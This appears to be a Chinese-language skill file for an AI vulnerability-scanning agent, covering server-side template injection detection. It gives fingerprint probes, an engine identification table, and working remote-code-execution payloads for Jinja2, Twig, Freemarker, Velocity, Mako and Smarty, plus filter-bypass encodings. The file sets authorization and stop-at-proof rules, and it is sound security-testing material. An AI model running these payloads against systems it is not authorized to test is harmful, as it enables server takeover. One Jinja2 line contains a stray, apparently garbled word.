---
name: hunt-ssti
description: 模板注入挖掘：注入面清单、七级纯算术指纹阶梯、引擎判定表、各引擎 RCE payload 阶梯（Jinja2/Twig/Freemarker/Velocity/Thymeleaf/Mako/ERB）
whenToUse: 输入回显进渲染结果（邮件模板/报表/动态页面/错误页/消息模板）时；配合知识库 SSTI 指纹模板脚本
role: vuln-scan
enabled: true
---

# SSTI 模板注入

## 注入面（模板注入 ≠ 页面参数）

| 场景 | 为什么有 SSTI |
|---|---|
| 邮件/站内信模板自定义 | 用户变量直接进 `render_template_string` 类调用 |
| 报表/单据模板编辑 | 模板字符串服务端渲染 |
| 动态页面名/主题 | `render(name)` 用户可控模板名 |
| CMS/低代码自定义组件 | 模板语法暴露给用户 |
| 错误页定制、i18n 文案 | 文案文件进模板引擎 |

## 七级指纹阶梯（全部纯算术，无副作用）

```text
{{7*7}}      → 49   Jinja2 / Twig（Jinja 系）
${7*7}       → 49   Freemarker / Velocity / Pebble / Mako(${})
<%= 7*7 %>   → 49   ERB / EJS
{7*7}        → 49   Smarty
{{7*'7'}}    → 7777777 = Jinja2；49 = Twig   ← 关键区分点
${T(java.lang.Runtime)} 报错含 java.lang → Java 模板确认
#{7*7}       → 49   Thymeleaf / Pebble 变体
```

批量自动化：知识库模板 poc `SSTI-引擎指纹阶梯探测…/fingerprint.py`（GET/header/body 三种注入位）。

## 引擎判定表（阶梯结果 → 引擎）

| 现象 | 引擎 |
|---|---|
| `{{7*7}}`→49 且 `{{7*'7'}}`→7777777 | Jinja2 (Python) |
| `{{7*7}}`→49 且 `{{7*'7'}}`→49 | Twig (PHP) |
| `${7*7}`→49 且 `${...}` 报 Java 类 | Freemarker / Velocity |
| `#{}` 与 `${}` 都通 | Thymeleaf |
| `{7*7}`→49 | Smarty (PHP) |
| `<%= %>` 通 | ERB(Ruby)/EJS(Node) |

## RCE payload 阶梯（引擎确认后，按序试）

**Jinja2**：`{{ config }}`（先拿配置/SECRET_KEY）→ `{{ ''.__class__.__mro__[1].__subclasses__() }}` 找 subprocess/os 类索引 → 经典 payload（ Lipunova/`request.application.__globals__` 变体绕过滤）。
**Twig**：`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`（Twig<3.x）。
**Freemarker**：`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`。
**Velocity**：`#set($x='')##set($rt=$x.class.forName('java.lang.Runtime'))##set($chr=$x.class.forName('java.lang.Character'))...Runtime.getRuntime().exec("id")`。
**Thymeleaf**：预处理表达式 `__${expression}__::${...}`（控制器返回值拼接场景）。
**Mako**：`${self.module.cache.util.os.popen('id').read()}`。
**Smarty**：`{Smarty_Internal_Write_File::writeFile(...)}` / 标签注入。

编码绕过：`{{7*7}}` 被实体化 → 换 `${7*7}`；全拦花括号 → 试 `{% if 1*7==7 %}ok{% endif %}`（Jinja2 语句块）；URL 层双编码 `%257B%257B`。

## 纪律

- 指纹阶梯无需授权理由（纯算术）；RCE 验证必须授权后进行，先 `id` 级证明即停
- 回填：category=rce，tags 带 ssti+引擎名，usage 放"注入位→阶梯结果→引擎→payload 证据"

<!-- 改编自: PayloadsAllTheThings(Server Side Template Injection) + 知识库 SSTI 指纹模板, 2026-10-31 -->
